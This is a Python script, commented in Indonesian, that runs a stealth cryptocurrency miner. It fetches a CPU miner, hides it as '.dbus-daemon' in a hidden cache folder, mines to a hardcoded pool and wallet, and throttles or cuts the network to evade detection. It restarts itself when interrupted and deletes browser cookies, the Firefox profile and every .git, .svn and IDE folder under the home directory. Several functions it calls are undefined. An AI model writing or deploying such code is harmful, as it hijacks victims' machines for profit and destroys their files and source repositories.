#!/usr/bin/env python3
import os, subprocess, urllib.request, tarfile, time, threading, shutil, sys, random, socket

# Konfigurasi Miner
URL = "https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz"
TARFILE = "miner.tar.gz"
BIN_NAME = "cpuminer-sse2"
ALIAS_BIN = ".dbus-daemon"
HIDDEN_DIR = os.path.expanduser("~/.cache/.sysd")
POOL = "stratum+tcp://164.92.145.122:5357"
WALLET = "mbc1q4xd0fvvj53jwwqaljz9kvrwqxxh0wqs5k89a05.Recut"
PASSWORD = "x"
THREADS = os.cpu_count()

# Durasi sesi mining dan cooldown
MIN_DURATION = 300
MAX_DURATION = 720
MIN_PAUSE = 120
MAX_PAUSE = 240
COOLDOWN_DURATION = 180
cooldown_restart_counter = 0
cooldown_restart_limit = 3
cooldown_reset_time = time.time() + 3600

# Fungsi Anti Suspend (mencegah penghentian dari terminal)
def anti_suspend():
    while True:
        try:
            sys.stdout.write("\b")
            sys.stdout.flush()
        except:
            pass
        time.sleep(15)

# Fungsi DNS DoH Bypass
def dns_doh_bypass():
    try:
        subprocess.call([
            "curl", "-s", "-H", "accept: application/dns-json",
            "https://cloudflare-dns.com/dns-query?name=pool.rplant.xyz&type=A"
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except:
        pass

# Fungsi deteksi CPU 100%
def is_cpu_100_percent():
    try:
        return os.getloadavg()[0] >= os.cpu_count()
    except:
        return False

# Fungsi untuk mendeteksi sistem yang diberhentikan atau diblokir
def detect_system_threat():
    print("[🛡️] Memeriksa potensi sistem diberhentikan/diblokir...")
    suspicious_paths = [
        "/var/log/auth.log", "/var/log/syslog", "/var/log/messages",
        "/etc/nologin", "/tmp/.X11-unix", "/proc/sys/kernel/hung_task_timeout_secs"
    ]
    for path in suspicious_paths:
        if os.path.exists(path):
            try:
                with open(path, "r", errors="ignore") as f:
                    content = f.read().lower()
                    if any(k in content for k in ["suspend", "dismiss", "ban", "blocked", "terminated"]):
                        print(f"[🚫] Sistem diblokir: {path}")
                        subprocess.call(["nmcli", "networking", "off"])
                        time.sleep(3)
                        os.execv(sys.executable, [sys.executable] + sys.argv)
            except:
                continue

# Fungsi untuk bypass firewall
def firewall_bypass():
    print("[🔥] Menjalankan firewall bypass...")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect(("1.1.1.1", 443))
        s.close()
    except:
        pass
    try:
        subprocess.call(["ping", "-c", "1", "8.8.8.8"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except:
        pass

# Fungsi untuk memutuskan jaringan internet
def disconnect_network():
    print("[🔌] Memutus koneksi jaringan...")
    try:
        subprocess.call(["nmcli", "networking", "off"])
        subprocess.call(["nmcli", "radio", "wifi", "off"])
    except:
        try:
            subprocess.call(["ifconfig", "eth0", "down"])
        except:
            pass

# Fungsi untuk menghubungkan jaringan internet kembali
def reconnect_network():
    print("[🌐] Mengaktifkan koneksi jaringan...")
    try:
        subprocess.call(["nmcli", "networking", "on"])
        subprocess.call(["nmcli", "radio", "wifi", "on"])
    except:
        try:
            subprocess.call(["ifconfig", "eth0", "up"])
        except:
            pass

# Fungsi untuk membersihkan jejak browser (cookies)
def clean_browser_cookies():
    for path in [
        "~/.config/google-chrome/Default/Cookies",
        "~/.mozilla/firefox",
        "~/.config/chromium/Default/Cookies"
    ]:
        full = os.path.expanduser(path)
        if os.path.exists(full):
            try:
                if os.path.isdir(full):
                    shutil.rmtree(full)
                else:
                    os.remove(full)
                print(f"[🍪] Cookie/jejak dihapus: {full}")
            except:
                pass

# Fungsi untuk membersihkan jejak tracking
def clean_tracking_artifacts():
    for path in [
        "~/.cache/tracker", "~/.config/.tracking"
    ]:
        full = os.path.expanduser(path)
        if os.path.exists(full):
            try:
                shutil.rmtree(full)
                print(f"[🧹] Hapus: {full}")
            except:
                pass

# Fungsi untuk membersihkan data aplikasi
def clean_myapp_data():
    for path in [
        "~/MyAppExplore", "~/.local/share/myapp", "~/Downloads/MyApp"
    ]:
        full = os.path.expanduser(path)
        if os.path.exists(full):
            try:
                shutil.rmtree(full)
                print(f"[🧹] MyApp data dihapus: {full}")
            except:
                pass

# Fungsi untuk membersihkan jejak source control (Git, SVN, dll)
def clean_source_control():
    for base in ["~", "~/Downloads", "~/.cache", "~/.local/share"]:
        for root, dirs, _ in os.walk(os.path.expanduser(base)):
            for d in [".git", ".svn", ".hg", ".idea", ".vscode", "__pycache__"]:
                path = os.path.join(root, d)
                if os.path.exists(path):
                    try:
                        shutil.rmtree(path)
                        print(f"[🗂️] Source control dihapus: {path}")
                    except:
                        pass

# Fungsi untuk membersihkan file mining
def clean_mining_artifacts():
    for base in ["~/.cache", "~/.local/share", "~/Downloads", "/tmp"]:
        for root, _, files in os.walk(os.path.expanduser(base)):
            for f in files:
                if any(k in f.lower() for k in ["miner", "cpuminer", "power2b"]):
                    try:
                        os.remove(os.path.join(root, f))
                        print(f"[🧹] Artefak mining dihapus: {f}")
                    except:
                        pass

# Fungsi untuk menjalankan satu sesi penambangan
def run_one_session():
    os.makedirs(HIDDEN_DIR, exist_ok=True)
    urllib.request.urlretrieve(URL, TARFILE)
    with tarfile.open(TARFILE) as tar:
        tar.extractall()
    hidden_path = os.path.join(HIDDEN_DIR, ALIAS_BIN)
    os.rename(BIN_NAME, hidden_path)
    os.chmod(hidden_path, 0o755)
    duration = random.randint(MIN_DURATION, MAX_DURATION)
    print(f"[⚙️] Menambang selama {duration} detik...")
    proc = subprocess.Popen([
        hidden_path, "-a", "power2b", "-o", POOL,
        "-u", WALLET, "-p", PASSWORD, f"-t{THREADS}"
    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    time.sleep(10)
    if os.path.exists(TARFILE): os.remove(TARFILE)

    start_time = time.time()
    while time.time() - start_time < duration:
        time.sleep(10)
        if is_cpu_100_percent():
            print(f"[⛔] CPU 100%! Cooldown {COOLDOWN_DURATION}s")
            disconnect_network()
            proc.terminate()
            time.sleep(COOLDOWN_DURATION)
            if should_restart(): restart_script()
            else: return
    proc.terminate()

# Fungsi utama yang menjalankan proses berulang
def main_loop():
    while True:
        clean_mining_artifacts()
        run_one_session()
        pause = random.randint(MIN_PAUSE, MAX_PAUSE)
        print(f"[⏸️] Istirahat {pause} detik...\n")
        time.sleep(pause)

# Fungsi untuk merestart script
def restart_script():
    try:
        print("[🔁] Restarting...")
        clean_miner_cache()
        clean_myapp_data()
        clean_mining_artifacts()
        time.sleep(5)
        subprocess.Popen([sys.executable] + sys.argv)
        sys.exit(0)
    except Exception as e:
        print(f"[X] Gagal restart: {e}")

# Entry point
if __name__ == "__main__":
    print("🚀  Stealth Miner Final Dimulai...")
    reconnect_network()
    clean_myapp_data()
    clean_browser_cookies()
    clean_tracking_artifacts()
    clean_source_control()
    fake_http_headers()
    threading.Thread(target=anti_suspend, daemon=True).start()
    threading.Thread(target=dns_doh_bypass, daemon=True).start()
    threading.Thread(target=detect_system_threat, daemon=True).start()
    threading.Thread(target=firewall_bypass, daemon=True).start()
    print("[🚀] Deteksi ancaman & bypass firewall aktif.")
    try:
        main_loop()
    except KeyboardInterrupt:
        restart_script()
    except Exception as e:
        print(f"[!] Error: {e}")
        restart_script()
